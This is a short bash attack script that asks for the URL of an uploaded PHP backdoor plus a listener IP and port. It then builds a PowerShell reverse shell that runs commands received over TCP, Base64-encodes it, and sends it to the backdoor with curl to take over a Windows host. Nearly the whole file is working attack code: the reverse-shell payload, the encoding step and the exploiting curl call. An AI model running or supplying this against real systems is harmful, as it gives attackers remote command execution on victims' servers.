#1. Ask the user for the Webaddress like: http://192.168.50.189/meteor/uploads/simple-backdoor.pHP
#2. Ask user for the listener IP ADDRESS:
#3. Ask user for the listener PORT
#4. You must have already uploaded a simple-backdoor.php to a webpage uploading place
#5. The target must be using windows since this script using powershell
#
#!/bin/bash

# Step 1: Ask the user for the web address
read -p "Enter the web address (e.g., http://192.168.50.189/meteor/uploads/simple-backdoor.pHP): " web_address

# Step 2: Ask the user for the listener IP address
read -p "Enter the listener IP address: " listener_ip

# Step 3: Ask the user for the listener port
read -p "Enter the listener port: " listener_port

# Step 4: Construct the PowerShell command
powershell_script="\$client = New-Object System.Net.Sockets.TCPClient('$listener_ip',$listener_port);\
\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};\
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0)\
{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\
\$sendback = (iex \$data 2>&1 | Out-String );\
\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\
\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\
\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\
\$stream.Flush()};\
\$client.Close()"

# Step 5: Encode the PowerShell script in Base64
encoded_bytes=$(echo -n "$powershell_script" | iconv -f ASCII -t UTF-16LE | base64 | tr -d '\n')

# Step 6: Output the curl command with the encoded PowerShell payload (uncomment/comment as necessary)
#echo "$encoded_bytes"
#echo "curl $web_address?cmd=powershell%20-enc%20$encoded_bytes"
curl $web_address?cmd=powershell%20-enc%20$encoded_bytes
